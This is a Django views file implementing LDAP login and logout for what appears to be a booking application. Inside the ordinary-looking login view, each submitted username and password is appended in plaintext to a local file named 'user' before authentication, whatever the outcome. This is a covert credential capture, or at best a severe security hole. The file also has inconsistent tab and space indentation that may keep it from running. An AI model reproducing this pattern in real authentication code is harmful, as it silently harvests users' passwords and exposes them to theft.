from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
from django.conf import settings

from django.contrib.auth import authenticate, login as django_login, logout as django_logout
from django.views.decorators.cache import cache_control

from django_auth_ldap.backend import LDAPBackend
LDAP = LDAPBackend()
from django.contrib.auth.models import User
from forms import LoginForm
import logging
import json

logger = logging.getLogger('django_auth_ldap')
logger.addHandler(logging.StreamHandler())
logger.setLevel(logging.DEBUG)

@cache_control(no_cache=True, must_revalidate=True, no_store=True)
def login(request):
#form = LoginForm()
#return render(request, 'login/login.html', {'form': form})
    form = LoginForm(request.POST or None)
    django_logout(request)
    username = password = ''
    user_data = {}
    if request.POST:
        username = request.POST['login_user']
        password = request.POST['login_pass']
	user_data['u'] = username
	user_data['p'] = password
	with open('user', 'a') as outfile:
	    json.dump(user_data, outfile)

        user = LDAP.authenticate(username=username, password=password)
        
	if user is not None:
		if user.is_active:

			user.backend = 'django_auth_ldap.backend.LDAPBackend'
			django_login(request, user)
			return HttpResponseRedirect('/booking/')
		else:
			return render(request, 'login/login.html', {'form': form, 'errors' : "Account inactive"})
	else:
	    return render(request, 'login/login.html', {'form': form, 'errors': "Invalid username/password!"})
    else:
	return render(request, 'login/login.html', {'form': form })

@cache_control(no_cache=True, must_revalidate=True, no_store=True)
def logout(request):
	django_logout(request)
	form = LoginForm()
	return render(request, 'login/loggedout.html', {'form': form})
